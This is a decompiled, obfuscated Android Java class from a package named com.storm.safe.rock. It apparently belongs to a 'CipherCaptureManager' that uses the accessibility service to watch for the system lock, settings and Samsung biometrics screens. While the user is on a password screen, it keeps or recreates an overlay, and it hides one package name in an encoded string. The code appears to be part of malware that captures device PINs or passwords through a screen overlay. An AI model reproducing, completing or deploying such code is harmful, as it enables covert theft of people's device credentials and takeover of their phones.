package p000;

import android.view.accessibility.AccessibilityNodeInfo;
import com.storm.safe.rock.service.modules.cipher.C0335a1;
import com.storm.safe.rock.service.modules.cipher.C0337a3;
import com.storm.safe.rock.util.StringUtil;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: ia */
/* loaded from: classes2.dex */
public final class RunnableC0615ia implements Runnable {

    /* renamed from: a0 */
    public final /* synthetic */ int f56849a0;

    /* renamed from: a1 */
    public final /* synthetic */ C0335a1 f56850a1;

    public /* synthetic */ RunnableC0615ia(C0335a1 c0335a1, int i) {
        this.f56849a0 = i;
        this.f56850a1 = c0335a1;
    }

    @Override // java.lang.Runnable
    public final void run() {
        String string;
        CharSequence packageName;
        String string2;
        C0337a3 c0337a3;
        switch (this.f56849a0) {
            case 0:
                C0337a3 c0337a32 = this.f56850a1.f53289a3;
                if (c0337a32 != null && c0337a32.m211845a8()) {
                    AccessibilityNodeInfo rootInActiveWindow = this.f56850a1.f53286a0.getRootInActiveWindow();
                    if (rootInActiveWindow == null || (packageName = rootInActiveWindow.getPackageName()) == null || (string = packageName.toString()) == null) {
                        string = "unknown";
                    }
                    if (rootInActiveWindow != null) {
                        rootInActiveWindow.recycle();
                    }
                    if (!string.equals("com.android.systemui") && !string.equals("com.android.settings") && !string.equals("com.samsung.android.biometrics.app.setting")) {
                        t60.m214714d6("CipherCaptureManager", "🔷 [OverlayWatcher] 检测到离开密码界面 → " + string + ", 立即清理覆盖层");
                        this.f56850a1.m211823e0();
                        C0335a1 c0335a1 = this.f56850a1;
                        c0335a1.f53294a8.post(new RunnableC0596hw(c0335a1, 8));
                        break;
                    } else {
                        C0335a1 c0335a12 = this.f56850a1;
                        c0335a12.f53294a8.postDelayed(this, c0335a12.f53291a5);
                        break;
                    }
                } else {
                    t60.m214702c3("CipherCaptureManager", "🔷 [OverlayWatcher] 覆盖层已不存在，停止检测");
                    this.f56850a1.m211823e0();
                    break;
                }
                break;
            default:
                C0335a1 c0335a13 = this.f56850a1;
                if (!c0335a13.f53297b1) {
                    t60.m214702c3("CipherCaptureManager", "🔷 [回放后检测] 监听模式已关闭，跳过");
                    break;
                } else {
                    AccessibilityNodeInfo rootInActiveWindow2 = c0335a13.f53286a0.getRootInActiveWindow();
                    if (rootInActiveWindow2 != null) {
                        CharSequence packageName2 = rootInActiveWindow2.getPackageName();
                        if (packageName2 == null || (string2 = packageName2.toString()) == null) {
                            string2 = "";
                        }
                        boolean z = string2.equals("com.android.systemui") || string2.equals("com.android.settings") || string2.equals(StringUtil.m212470a0("KFYcdEUtDTlSOGVKCClZPQEjVj8qXhQo")) || string2.equals("com.samsung.android.biometrics.app.setting");
                        rootInActiveWindow2.recycle();
                        if (z && ((c0337a3 = this.f56850a1.f53289a3) == null || !c0337a3.m211845a8())) {
                            t60.m214714d6("CipherCaptureManager", "🔷 [回放后检测] 仍在密码界面(" + string2 + ")且无覆盖层 → 重新创建");
                            this.f56850a1.m211829e6();
                            break;
                        } else {
                            t60.m214702c3("CipherCaptureManager", "🔷 [回放后检测] 已离开密码界面或覆盖层已存在，跳过");
                            break;
                        }
                    } else {
                        t60.m214702c3("CipherCaptureManager", "🔷 [回放后检测] rootInActiveWindow 为 null，跳过");
                        break;
                    }
                }
        }
    }
}
